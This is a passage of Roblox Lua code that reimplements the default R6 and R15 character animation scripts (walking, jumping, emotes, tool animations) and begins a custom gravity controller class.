				local oldAnim = toolAnimName

				if (currentToolAnimKeyframeHandler ~= nil) then
					currentToolAnimKeyframeHandler:disconnect()
				end

				toolAnimName = ""
				toolAnimInstance = nil
				if (toolAnimTrack ~= nil) then
					toolAnimTrack:Stop()
					toolAnimTrack:Destroy()
					toolAnimTrack = nil
				end


				return oldAnim
			end

			-------------------------------------------------------------------------------------------
			-------------------------------------------------------------------------------------------


			function onRunning(speed)
				if speed > 0.01 then
					playAnimation("walk", 0.1, Humanoid)
					if currentAnimInstance and currentAnimInstance.AnimationId == "http://www.roblox.com/asset/?id=180426354" then
						setAnimationSpeed(speed / 14.5)
					end
					pose = "Running"
				else
					if emoteNames[currentAnim] == nil then
						playAnimation("idle", 0.1, Humanoid)
						pose = "Standing"
					end
				end
			end

			function onDied()
				pose = "Dead"
			end

			function onJumping()
				playAnimation("jump", 0.1, Humanoid)
				jumpAnimTime = jumpAnimDuration
				pose = "Jumping"
			end

			function onClimbing(speed)
				playAnimation("climb", 0.1, Humanoid)
				setAnimationSpeed(speed / 12.0)
				pose = "Climbing"
			end

			function onGettingUp()
				pose = "GettingUp"
			end

			function onFreeFall()
				if (jumpAnimTime <= 0) then
					playAnimation("fall", fallTransitionTime, Humanoid)
				end
				pose = "FreeFall"
			end

			function onFallingDown()
				pose = "FallingDown"
			end

			function onSeated()
				pose = "Seated"
			end

			function onPlatformStanding()
				pose = "PlatformStanding"
			end

			function onSwimming(speed)
				if speed > 0 then
					pose = "Running"
				else
					pose = "Standing"
				end
			end

			function getTool()	
				for _, kid in ipairs(Figure:GetChildren()) do
					if kid.className == "Tool" then return kid end
				end
				return nil
			end

			function getToolAnim(tool)
				for _, c in ipairs(tool:GetChildren()) do
					if c.Name == "toolanim" and c.className == "StringValue" then
						return c
					end
				end
				return nil
			end

			function animateTool()

				if (toolAnim == "None") then
					playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
					return
				end

				if (toolAnim == "Slash") then
					playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
					return
				end

				if (toolAnim == "Lunge") then
					playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
					return
				end
			end

			function moveSit()
				RightShoulder.MaxVelocity = 0.15
				LeftShoulder.MaxVelocity = 0.15
				RightShoulder:SetDesiredAngle(3.14 /2)
				LeftShoulder:SetDesiredAngle(-3.14 /2)
				RightHip:SetDesiredAngle(3.14 /2)
				LeftHip:SetDesiredAngle(-3.14 /2)
			end

			local lastTick = 0

			function move(time)
				local amplitude = 1
				local frequency = 1
				local deltaTime = time - lastTick
				lastTick = time

				local climbFudge = 0
				local setAngles = false

				if (jumpAnimTime > 0) then
					jumpAnimTime = jumpAnimTime - deltaTime
				end

				if (pose == "FreeFall" and jumpAnimTime <= 0) then
					playAnimation("fall", fallTransitionTime, Humanoid)
				elseif (pose == "Seated") then
					playAnimation("sit", 0.5, Humanoid)
					return
				elseif (pose == "Running") then
					playAnimation("walk", 0.1, Humanoid)
				elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
					--		print("Wha " .. pose)
					stopAllAnimations()
					amplitude = 0.1
					frequency = 1
					setAngles = true
				end

				if (setAngles) then
					local desiredAngle = amplitude * math.sin(time * frequency)

					RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
					LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
					RightHip:SetDesiredAngle(-desiredAngle)
					LeftHip:SetDesiredAngle(-desiredAngle)
				end

				-- Tool Animation handling
				local tool = getTool()
				if tool and tool:FindFirstChild("Handle") then

					local animStringValueObject = getToolAnim(tool)

					if animStringValueObject then
						toolAnim = animStringValueObject.Value
						-- message recieved, delete StringValue
						animStringValueObject.Parent = nil
						toolAnimTime = time + .3
					end

					if time > toolAnimTime then
						toolAnimTime = 0
						toolAnim = "None"
					end

					animateTool()		
				else
					stopToolAnimations()
					toolAnim = "None"
					toolAnimInstance = nil
					toolAnimTime = 0
				end
			end


			local events = {}
			local eventHum = Humanoid

			local function onUnhook()
				for i = 1, #events do
					events[i]:Disconnect()
				end
				events = {}
			end

			local function onHook()
				onUnhook()

				pose = eventHum.Sit and "Seated" or "Standing"

				events = {
					eventHum.Died:connect(onDied),
					eventHum.Running:connect(onRunning),
					eventHum.Jumping:connect(onJumping),
					eventHum.Climbing:connect(onClimbing),
					eventHum.GettingUp:connect(onGettingUp),
					eventHum.FreeFalling:connect(onFreeFall),
					eventHum.FallingDown:connect(onFallingDown),
					eventHum.Seated:connect(onSeated),
					eventHum.PlatformStanding:connect(onPlatformStanding),
					eventHum.Swimming:connect(onSwimming)
				}
			end


			onHook()

			-- setup emote chat hook
			game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
				local emote = ""
				if msg == "/e dance" then
					emote = dances[math.random(1, #dances)]
				elseif (string.sub(msg, 1, 3) == "/e ") then
					emote = string.sub(msg, 4)
				elseif (string.sub(msg, 1, 7) == "/emote ") then
					emote = string.sub(msg, 8)
				end

				if (pose == "Standing" and emoteNames[emote] ~= nil) then
					playAnimation(emote, 0.1, Humanoid)
				end

			end)


			-- main program

			-- initialize to idle
			playAnimation("idle", 0.1, Humanoid)
			pose = "Standing"

			spawn(function()
				while Figure.Parent ~= nil do
					local _, time = wait(0.1)
					move(time)
				end
			end)

			return {
				onRunning = onRunning, 
				onDied = onDied, 
				onJumping = onJumping, 
				onClimbing = onClimbing, 
				onGettingUp = onGettingUp, 
				onFreeFall = onFreeFall, 
				onFallingDown = onFallingDown, 
				onSeated = onSeated, 
				onPlatformStanding = onPlatformStanding,
				onHook = onHook,
				onUnhook = onUnhook
			}

		end
		return r6()
	end

	function _R15()
		local function r15()

			local Character = char
			local Humanoid = Character:WaitForChild("Humanoid")
			local pose = "Standing"

			local userNoUpdateOnLoopSuccess, userNoUpdateOnLoopValue = pcall(function() return UserSettings():IsUserFeatureEnabled("UserNoUpdateOnLoop") end)
			local userNoUpdateOnLoop = userNoUpdateOnLoopSuccess and userNoUpdateOnLoopValue
			local userAnimationSpeedDampeningSuccess, userAnimationSpeedDampeningValue = pcall(function() return UserSettings():IsUserFeatureEnabled("UserAnimationSpeedDampening") end)
			local userAnimationSpeedDampening = userAnimationSpeedDampeningSuccess and userAnimationSpeedDampeningValue

			local animateScriptEmoteHookFlagExists, animateScriptEmoteHookFlagEnabled = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserAnimateScriptEmoteHook")
			end)
			local FFlagAnimateScriptEmoteHook = animateScriptEmoteHookFlagExists and animateScriptEmoteHookFlagEnabled

			local AnimationSpeedDampeningObject = script:FindFirstChild("ScaleDampeningPercent")
			local HumanoidHipHeight = 2

			local EMOTE_TRANSITION_TIME = 0.1

			local currentAnim = ""
			local currentAnimInstance = nil
			local currentAnimTrack = nil
			local currentAnimKeyframeHandler = nil
			local currentAnimSpeed = 1.0

			local runAnimTrack = nil
			local runAnimKeyframeHandler = nil

			local animTable = {}
			local animNames = { 
				idle = 	{	
					{ id = "http://www.roblox.com/asset/?id=507766666", weight = 1 },
					{ id = "http://www.roblox.com/asset/?id=507766951", weight = 1 },
					{ id = "http://www.roblox.com/asset/?id=507766388", weight = 9 }
				},
				walk = 	{ 	
					{ id = "http://www.roblox.com/asset/?id=507777826", weight = 10 } 
				}, 
				run = 	{
					{ id = "http://www.roblox.com/asset/?id=507767714", weight = 10 } 
				}, 
				swim = 	{
					{ id = "http://www.roblox.com/asset/?id=507784897", weight = 10 } 
				}, 
				swimidle = 	{
					{ id = "http://www.roblox.com/asset/?id=507785072", weight = 10 } 
				}, 
				jump = 	{
					{ id = "http://www.roblox.com/asset/?id=507765000", weight = 10 } 
				}, 
				fall = 	{
					{ id = "http://www.roblox.com/asset/?id=507767968", weight = 10 } 
				}, 
				climb = {
					{ id = "http://www.roblox.com/asset/?id=507765644", weight = 10 } 
				}, 
				sit = 	{
					{ id = "http://www.roblox.com/asset/?id=2506281703", weight = 10 } 
				},	
				toolnone = {
					{ id = "http://www.roblox.com/asset/?id=507768375", weight = 10 } 
				},
				toolslash = {
					{ id = "http://www.roblox.com/asset/?id=522635514", weight = 10 } 
				},
				toollunge = {
					{ id = "http://www.roblox.com/asset/?id=522638767", weight = 10 } 
				},
				wave = {
					{ id = "http://www.roblox.com/asset/?id=507770239", weight = 10 } 
				},
				point = {
					{ id = "http://www.roblox.com/asset/?id=507770453", weight = 10 } 
				},
				dance = {
					{ id = "http://www.roblox.com/asset/?id=507771019", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507771955", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507772104", weight = 10 } 
				},
				dance2 = {
					{ id = "http://www.roblox.com/asset/?id=507776043", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507776720", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507776879", weight = 10 } 
				},
				dance3 = {
					{ id = "http://www.roblox.com/asset/?id=507777268", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507777451", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507777623", weight = 10 } 
				},
				laugh = {
					{ id = "http://www.roblox.com/asset/?id=507770818", weight = 10 } 
				},
				cheer = {
					{ id = "http://www.roblox.com/asset/?id=507770677", weight = 10 } 
				},
			}

			-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
			local emoteNames = { wave = false, point = false, dance = true, dance2 = true, dance3 = true, laugh = false, cheer = false}

			local PreloadAnimsUserFlag = false
			local PreloadedAnims = {}
			local successPreloadAnim, msgPreloadAnim = pcall(function()
				PreloadAnimsUserFlag = UserSettings():IsUserFeatureEnabled("UserPreloadAnimations")
			end)
			if not successPreloadAnim then
				PreloadAnimsUserFlag = false
			end

			math.randomseed(tick())

			function findExistingAnimationInSet(set, anim)
				if set == nil or anim == nil then
					return 0
				end

				for idx = 1, set.count, 1 do 
					if set[idx].anim.AnimationId == anim.AnimationId then
						return idx
					end
				end

				return 0
			end

			function configureAnimationSet(name, fileList)
				if (animTable[name] ~= nil) then
					for _, connection in pairs(animTable[name].connections) do
						connection:disconnect()
					end
				end
				animTable[name] = {}
				animTable[name].count = 0
				animTable[name].totalWeight = 0	
				animTable[name].connections = {}

				local allowCustomAnimations = true

				local success, msg = pcall(function() allowCustomAnimations = game:GetService("StarterPlayer").AllowCustomAnimations end)
				if not success then
					allowCustomAnimations = true
				end

				-- check for config values
				local config = script:FindFirstChild(name)
				if (allowCustomAnimations and config ~= nil) then
					table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
					table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))

					local idx = 0
					for _, childPart in pairs(config:GetChildren()) do
						if (childPart:IsA("Animation")) then
							local newWeight = 1
							local weightObject = childPart:FindFirstChild("Weight")
							if (weightObject ~= nil) then
								newWeight = weightObject.Value
							end
							animTable[name].count = animTable[name].count + 1
							idx = animTable[name].count
							animTable[name][idx] = {}
							animTable[name][idx].anim = childPart
							animTable[name][idx].weight = newWeight
							animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
							table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
							table.insert(animTable[name].connections, childPart.ChildAdded:connect(function(property) configureAnimationSet(name, fileList) end))
							table.insert(animTable[name].connections, childPart.ChildRemoved:connect(function(property) configureAnimationSet(name, fileList) end))
						end
					end
				end

				-- fallback to defaults
				if (animTable[name].count <= 0) then
					for idx, anim in pairs(fileList) do
						animTable[name][idx] = {}
						animTable[name][idx].anim = Instance.new("Animation")
						animTable[name][idx].anim.Name = name
						animTable[name][idx].anim.AnimationId = anim.id
						animTable[name][idx].weight = anim.weight
						animTable[name].count = animTable[name].count + 1
						animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
					end
				end

				-- preload anims
				if PreloadAnimsUserFlag then
					for i, animType in pairs(animTable) do
						for idx = 1, animType.count, 1 do
							if PreloadedAnims[animType[idx].anim.AnimationId] == nil then
								Humanoid:LoadAnimation(animType[idx].anim)
								PreloadedAnims[animType[idx].anim.AnimationId] = true
							end				
						end
					end
				end
			end

			------------------------------------------------------------------------------------------------------------

			function configureAnimationSetOld(name, fileList)
				if (animTable[name] ~= nil) then
					for _, connection in pairs(animTable[name].connections) do
						connection:disconnect()
					end
				end
				animTable[name] = {}
				animTable[name].count = 0
				animTable[name].totalWeight = 0	
				animTable[name].connections = {}

				local allowCustomAnimations = true

				local success, msg = pcall(function() allowCustomAnimations = game:GetService("StarterPlayer").AllowCustomAnimations end)
				if not success then
					allowCustomAnimations = true
				end

				-- check for config values
				local config = script:FindFirstChild(name)
				if (allowCustomAnimations and config ~= nil) then
					table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
					table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
					local idx = 1
					for _, childPart in pairs(config:GetChildren()) do
						if (childPart:IsA("Animation")) then
							table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
							animTable[name][idx] = {}
							animTable[name][idx].anim = childPart
							local weightObject = childPart:FindFirstChild("Weight")
							if (weightObject == nil) then
								animTable[name][idx].weight = 1
							else
								animTable[name][idx].weight = weightObject.Value
							end
							animTable[name].count = animTable[name].count + 1
							animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
							idx = idx + 1
						end
					end
				end

				-- fallback to defaults
				if (animTable[name].count <= 0) then
					for idx, anim in pairs(fileList) do
						animTable[name][idx] = {}
						animTable[name][idx].anim = Instance.new("Animation")
						animTable[name][idx].anim.Name = name
						animTable[name][idx].anim.AnimationId = anim.id
						animTable[name][idx].weight = anim.weight
						animTable[name].count = animTable[name].count + 1
						animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
						-- print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
					end
				end

				-- preload anims
				if PreloadAnimsUserFlag then
					for i, animType in pairs(animTable) do
						for idx = 1, animType.count, 1 do 
							Humanoid:LoadAnimation(animType[idx].anim)
						end
					end
				end
			end

			-- Setup animation objects
			function scriptChildModified(child)
				local fileList = animNames[child.Name]
				if (fileList ~= nil) then
					configureAnimationSet(child.Name, fileList)
				end	
			end

			script.ChildAdded:connect(scriptChildModified)
			script.ChildRemoved:connect(scriptChildModified)


			for name, fileList in pairs(animNames) do 
				configureAnimationSet(name, fileList)
			end	

			-- ANIMATION

			-- declarations
			local toolAnim = "None"
			local toolAnimTime = 0

			local jumpAnimTime = 0
			local jumpAnimDuration = 0.31

			local toolTransitionTime = 0.1
			local fallTransitionTime = 0.2

			local currentlyPlayingEmote = false

			-- functions

			function stopAllAnimations()
				local oldAnim = currentAnim

				-- return to idle if finishing an emote
				if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
					oldAnim = "idle"
				end

				if FFlagAnimateScriptEmoteHook and currentlyPlayingEmote then
					oldAnim = "idle"
					currentlyPlayingEmote = false
				end

				currentAnim = ""
				currentAnimInstance = nil
				if (currentAnimKeyframeHandler ~= nil) then
					currentAnimKeyframeHandler:disconnect()
				end

				if (currentAnimTrack ~= nil) then
					currentAnimTrack:Stop()
					currentAnimTrack:Destroy()
					currentAnimTrack = nil
				end

				-- clean up walk if there is one
				if (runAnimKeyframeHandler ~= nil) then
					runAnimKeyframeHandler:disconnect()
				end

				if (runAnimTrack ~= nil) then
					runAnimTrack:Stop()
					runAnimTrack:Destroy()
					runAnimTrack = nil
				end

				return oldAnim
			end

			function getHeightScale()
				if Humanoid then
					if not Humanoid.AutomaticScalingEnabled then
						return 1
					end

					local scale = Humanoid.HipHeight / HumanoidHipHeight
					if userAnimationSpeedDampening then
						if AnimationSpeedDampeningObject == nil then
							AnimationSpeedDampeningObject = script:FindFirstChild("ScaleDampeningPercent")
						end
						if AnimationSpeedDampeningObject ~= nil then
							scale = 1 + (Humanoid.HipHeight - HumanoidHipHeight) * AnimationSpeedDampeningObject.Value / HumanoidHipHeight
						end
					end
					return scale
				end	
				return 1
			end

			local smallButNotZero = 0.0001
			function setRunSpeed(speed)
				local speedScaled = speed * 1.25
				local heightScale = getHeightScale()
				local runSpeed = speedScaled / heightScale

				if runSpeed ~= currentAnimSpeed then
					if runSpeed < 0.33 then
						currentAnimTrack:AdjustWeight(1.0)		
						runAnimTrack:AdjustWeight(smallButNotZero)
					elseif runSpeed < 0.66 then
						local weight = ((runSpeed - 0.33) / 0.33)
						currentAnimTrack:AdjustWeight(1.0 - weight + smallButNotZero)
						runAnimTrack:AdjustWeight(weight + smallButNotZero)
					else
						currentAnimTrack:AdjustWeight(smallButNotZero)
						runAnimTrack:AdjustWeight(1.0)
					end
					currentAnimSpeed = runSpeed
					runAnimTrack:AdjustSpeed(runSpeed)
					currentAnimTrack:AdjustSpeed(runSpeed)
				end	
			end

			function setAnimationSpeed(speed)
				if currentAnim == "walk" then
					setRunSpeed(speed)
				else
					if speed ~= currentAnimSpeed then
						currentAnimSpeed = speed
						currentAnimTrack:AdjustSpeed(currentAnimSpeed)
					end
				end
			end

			function keyFrameReachedFunc(frameName)
				if (frameName == "End") then
					if currentAnim == "walk" then
						if userNoUpdateOnLoop == true then
							if runAnimTrack.Looped ~= true then
								runAnimTrack.TimePosition = 0.0
							end
							if currentAnimTrack.Looped ~= true then
								currentAnimTrack.TimePosition = 0.0
							end
						else
							runAnimTrack.TimePosition = 0.0
							currentAnimTrack.TimePosition = 0.0
						end
					else
						local repeatAnim = currentAnim
						-- return to idle if finishing an emote
						if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
							repeatAnim = "idle"
						end

						if FFlagAnimateScriptEmoteHook and currentlyPlayingEmote then
							if currentAnimTrack.Looped then
								-- Allow the emote to loop
								return
							end

							repeatAnim = "idle"
							currentlyPlayingEmote = false
						end

						local animSpeed = currentAnimSpeed
						playAnimation(repeatAnim, 0.15, Humanoid)
						setAnimationSpeed(animSpeed)
					end
				end
			end

			function rollAnimation(animName)
				local roll = math.random(1, animTable[animName].totalWeight) 
				local origRoll = roll
				local idx = 1
				while (roll > animTable[animName][idx].weight) do
					roll = roll - animTable[animName][idx].weight
					idx = idx + 1
				end
				return idx
			end

			local function switchToAnim(anim, animName, transitionTime, humanoid)
				-- switch animation		
				if (anim ~= currentAnimInstance) then

					if (currentAnimTrack ~= nil) then
						currentAnimTrack:Stop(transitionTime)
						currentAnimTrack:Destroy()
					end

					if (runAnimTrack ~= nil) then
						runAnimTrack:Stop(transitionTime)
						runAnimTrack:Destroy()
						if userNoUpdateOnLoop == true then
							runAnimTrack = nil
						end
					end

					currentAnimSpeed = 1.0

					-- load it to the humanoid; get AnimationTrack
					currentAnimTrack = humanoid:LoadAnimation(anim)
					currentAnimTrack.Priority = Enum.AnimationPriority.Core

					-- play the animation
					currentAnimTrack:Play(transitionTime)
					currentAnim = animName
					currentAnimInstance = anim

					-- set up keyframe name triggers
					if (currentAnimKeyframeHandler ~= nil) then
						currentAnimKeyframeHandler:disconnect()
					end
					currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)

					-- check to see if we need to blend a walk/run animation
					if animName == "walk" then
						local runAnimName = "run"
						local runIdx = rollAnimation(runAnimName)

						runAnimTrack = humanoid:LoadAnimation(animTable[runAnimName][runIdx].anim)
						runAnimTrack.Priority = Enum.AnimationPriority.Core
						runAnimTrack:Play(transitionTime)		

						if (runAnimKeyframeHandler ~= nil) then
							runAnimKeyframeHandler:disconnect()
						end
						runAnimKeyframeHandler = runAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)	
					end
				end
			end

			function playAnimation(animName, transitionTime, humanoid) 	
				local idx = rollAnimation(animName)
				local anim = animTable[animName][idx].anim

				switchToAnim(anim, animName, transitionTime, humanoid)
				currentlyPlayingEmote = false
			end

			function playEmote(emoteAnim, transitionTime, humanoid)
				switchToAnim(emoteAnim, emoteAnim.Name, transitionTime, humanoid)
				currentlyPlayingEmote = true
			end

			-------------------------------------------------------------------------------------------
			-------------------------------------------------------------------------------------------

			local toolAnimName = ""
			local toolAnimTrack = nil
			local toolAnimInstance = nil
			local currentToolAnimKeyframeHandler = nil

			function toolKeyFrameReachedFunc(frameName)
				if (frameName == "End") then
					playToolAnimation(toolAnimName, 0.0, Humanoid)
				end
			end


			function playToolAnimation(animName, transitionTime, humanoid, priority)	 		
				local idx = rollAnimation(animName)
				local anim = animTable[animName][idx].anim

				if (toolAnimInstance ~= anim) then

					if (toolAnimTrack ~= nil) then
						toolAnimTrack:Stop()
						toolAnimTrack:Destroy()
						transitionTime = 0
					end

					-- load it to the humanoid; get AnimationTrack
					toolAnimTrack = humanoid:LoadAnimation(anim)
					if priority then
						toolAnimTrack.Priority = priority
					end

					-- play the animation
					toolAnimTrack:Play(transitionTime)
					toolAnimName = animName
					toolAnimInstance = anim

					currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
				end
			end

			function stopToolAnimations()
				local oldAnim = toolAnimName

				if (currentToolAnimKeyframeHandler ~= nil) then
					currentToolAnimKeyframeHandler:disconnect()
				end

				toolAnimName = ""
				toolAnimInstance = nil
				if (toolAnimTrack ~= nil) then
					toolAnimTrack:Stop()
					toolAnimTrack:Destroy()
					toolAnimTrack = nil
				end

				return oldAnim
			end

			-------------------------------------------------------------------------------------------
			-------------------------------------------------------------------------------------------
			-- STATE CHANGE HANDLERS

			function onRunning(speed)
				if speed > 0.75 then
					local scale = 16.0
					playAnimation("walk", 0.2, Humanoid)
					setAnimationSpeed(speed / scale)
					pose = "Running"
				else
					if emoteNames[currentAnim] == nil and not currentlyPlayingEmote then
						playAnimation("idle", 0.2, Humanoid)
						pose = "Standing"
					end
				end
			end

			function onDied()
				pose = "Dead"
			end

			function onJumping()
				playAnimation("jump", 0.1, Humanoid)
				jumpAnimTime = jumpAnimDuration
				pose = "Jumping"
			end

			function onClimbing(speed)
				local scale = 5.0
				playAnimation("climb", 0.1, Humanoid)
				setAnimationSpeed(speed / scale)
				pose = "Climbing"
			end

			function onGettingUp()
				pose = "GettingUp"
			end

			function onFreeFall()
				if (jumpAnimTime <= 0) then
					playAnimation("fall", fallTransitionTime, Humanoid)
				end
				pose = "FreeFall"
			end

			function onFallingDown()
				pose = "FallingDown"
			end

			function onSeated()
				pose = "Seated"
			end

			function onPlatformStanding()
				pose = "PlatformStanding"
			end

			-------------------------------------------------------------------------------------------
			-------------------------------------------------------------------------------------------

			function onSwimming(speed)
				if speed > 1.00 then
					local scale = 10.0
					playAnimation("swim", 0.4, Humanoid)
					setAnimationSpeed(speed / scale)
					pose = "Swimming"
				else
					playAnimation("swimidle", 0.4, Humanoid)
					pose = "Standing"
				end
			end

			function animateTool()
				if (toolAnim == "None") then
					playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
					return
				end

				if (toolAnim == "Slash") then
					playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
					return
				end

				if (toolAnim == "Lunge") then
					playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
					return
				end
			end

			function getToolAnim(tool)
				for _, c in ipairs(tool:GetChildren()) do
					if c.Name == "toolanim" and c.className == "StringValue" then
						return c
					end
				end
				return nil
			end

			local lastTick = 0

			function stepAnimate(currentTime)
				local amplitude = 1
				local frequency = 1
				local deltaTime = currentTime - lastTick
				lastTick = currentTime

				local climbFudge = 0
				local setAngles = false

				if (jumpAnimTime > 0) then
					jumpAnimTime = jumpAnimTime - deltaTime
				end

				if (pose == "FreeFall" and jumpAnimTime <= 0) then
					playAnimation("fall", fallTransitionTime, Humanoid)
				elseif (pose == "Seated") then
					playAnimation("sit", 0.5, Humanoid)
					return
				elseif (pose == "Running") then
					playAnimation("walk", 0.2, Humanoid)
				elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
					stopAllAnimations()
					amplitude = 0.1
					frequency = 1
					setAngles = true
				end

				-- Tool Animation handling
				local tool = Character:FindFirstChildOfClass("Tool")
				if tool and tool:FindFirstChild("Handle") then
					local animStringValueObject = getToolAnim(tool)

					if animStringValueObject then
						toolAnim = animStringValueObject.Value
						-- message recieved, delete StringValue
						animStringValueObject.Parent = nil
						toolAnimTime = currentTime + .3
					end

					if currentTime > toolAnimTime then
						toolAnimTime = 0
						toolAnim = "None"
					end

					animateTool()		
				else
					stopToolAnimations()
					toolAnim = "None"
					toolAnimInstance = nil
					toolAnimTime = 0
				end
			end

			-- connect events

			local events = {}
			local eventHum = Humanoid

			local function onUnhook()
				for i = 1, #events do
					events[i]:Disconnect()
				end
				events = {}
			end

			local function onHook()
				onUnhook()

				pose = eventHum.Sit and "Seated" or "Standing"

				events = {
					eventHum.Died:connect(onDied),
					eventHum.Running:connect(onRunning),
					eventHum.Jumping:connect(onJumping),
					eventHum.Climbing:connect(onClimbing),
					eventHum.GettingUp:connect(onGettingUp),
					eventHum.FreeFalling:connect(onFreeFall),
					eventHum.FallingDown:connect(onFallingDown),
					eventHum.Seated:connect(onSeated),
					eventHum.PlatformStanding:connect(onPlatformStanding),
					eventHum.Swimming:connect(onSwimming)
				}
			end


			onHook()

			-- setup emote chat hook
			game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
				local emote = ""
				if (string.sub(msg, 1, 3) == "/e ") then
					emote = string.sub(msg, 4)
				elseif (string.sub(msg, 1, 7) == "/emote ") then
					emote = string.sub(msg, 8)
				end

				if (pose == "Standing" and emoteNames[emote] ~= nil) then
					playAnimation(emote, EMOTE_TRANSITION_TIME, Humanoid)
				end
			end)

	--[[ emote bindable hook
	if FFlagAnimateScriptEmoteHook then
		script:WaitForChild("PlayEmote").OnInvoke = function(emote)
			-- Only play emotes when idling
			if pose ~= "Standing" then
				return
			end
			if emoteNames[emote] ~= nil then
				-- Default emotes
				playAnimation(emote, EMOTE_TRANSITION_TIME, Humanoid)
				return true
			elseif typeof(emote) == "Instance" and emote:IsA("Animation") then
				-- Non-default emotes
				playEmote(emote, EMOTE_TRANSITION_TIME, Humanoid)
				return true
			end
			-- Return false to indicate that the emote could not be played
			return false
		end
	end
	]]
			-- initialize to idle
			playAnimation("idle", 0.1, Humanoid)
			pose = "Standing"
			-- loop to handle timed state transitions and tool animations
			spawn(function()
				while Character.Parent ~= nil do
					local _, currentGameTime = wait(0.1)
					stepAnimate(currentGameTime)
				end
			end)
			return {
				onRunning = onRunning, 
				onDied = onDied, 
				onJumping = onJumping, 
				onClimbing = onClimbing, 
				onGettingUp = onGettingUp, 
				onFreeFall = onFreeFall, 
				onFallingDown = onFallingDown, 
				onSeated = onSeated, 
				onPlatformStanding = onPlatformStanding,
				onHook = onHook,
				onUnhook = onUnhook
			}
		end
		return r15()
	end
	while true do
		wait(.1)
		if plr.Character ~= nil then
			char = plr.Character
			break
		end
	end
	function _Controller()
		local humanoid = char:WaitForChild("Humanoid")
		local animFuncs = {}
		if (humanoid.RigType == Enum.HumanoidRigType.R6) then
			animFuncs = _R6()
		else
			animFuncs = _R15()
		end
		print("Animation succes")
		return animFuncs
	end
	function _AnimationHandler()
		local AnimationHandler = {}
		AnimationHandler.__index = AnimationHandler

		function AnimationHandler.new(humanoid, animate)
			local self = setmetatable({}, AnimationHandler)

			self._AnimFuncs = _Controller()
			self.Humanoid = humanoid

			return self
		end

		function AnimationHandler:EnableDefault(bool)
			if (bool) then
				self._AnimFuncs.onHook()
			else
				self._AnimFuncs.onUnhook()
			end
		end

		function AnimationHandler:Run(name, ...)
			self._AnimFuncs[name](...)
		end

		return AnimationHandler
	end

	function _GravityController()

		local ZERO = Vector3.new(0, 0, 0)
		local UNIT_X = Vector3.new(1, 0, 0)
		local UNIT_Y = Vector3.new(0, 1, 0)
		local UNIT_Z = Vector3.new(0, 0, 1)
		local VEC_XY = Vector3.new(1, 0, 1)

		local IDENTITYCF = CFrame.new()

		local JUMPMODIFIER = 1.2
		local TRANSITION = 0.15
		local WALKF = 200 / 3

		local UIS = game:GetService("UserInputService")
		local RUNSERVICE = game:GetService("RunService")

		local InitObjects = _InitObjects()
		local AnimationHandler = _AnimationHandler()
		local StateTracker = _StateTracker()

		-- Class

		local GravityController = {}
		GravityController.__index = GravityController

		-- Private Functions

		local function getRotationBetween(u, v, axis)
			local dot, uxv = u:Dot(v), u:Cross(v)
			if (dot < -0.99999) then return CFrame.fromAxisAngle(axis, math.pi) end
			return CFrame.new(0, 0, 0, uxv.x, uxv.y, uxv.z, 1 + dot)
		end

		local function lookAt(pos, forward, up)
			local r = forward:Cross(up)
			local u = r:Cross(forward)
			return CFrame.fromMatrix(pos, r.Unit, u.Unit)
		end

		local function getMass(array)
			local mass = 0
			for _, part in next, array do
				if (part:IsA("BasePart")) then
					mass = mass + part:GetMass()
				end
			end
			return mass
		end

		-- Public Constructor
		local ExecutedPlayerModule = _PlayerModule()
		local ExecutedSounds = _sounds()
		function GravityController.new(player)
			local self = setmetatable({}, GravityController)

	--[[ Camera
	local loaded = player.PlayerScripts:WaitForChild("PlayerScriptsLoader"):WaitForChild("Loaded")
	if (not loaded.Value) then
		--loaded.Changed:Wait()
	end
	]]
			local playerModule = ExecutedPlayerModule
			self.Controls = playerModule:GetControls()
			self.Camera = playerModule:GetCameras()

			-- Player and character
			self.Player = player
			self.Character = player.Character
			self.Humanoid = player.Character:WaitForChild("Humanoid")
			self.HRP = player.Character:WaitForChild("HumanoidRootPart")

			-- Animation
			self.AnimationHandler = AnimationHandler.new(self.Humanoid, self.Character:WaitForChild("Animate"))
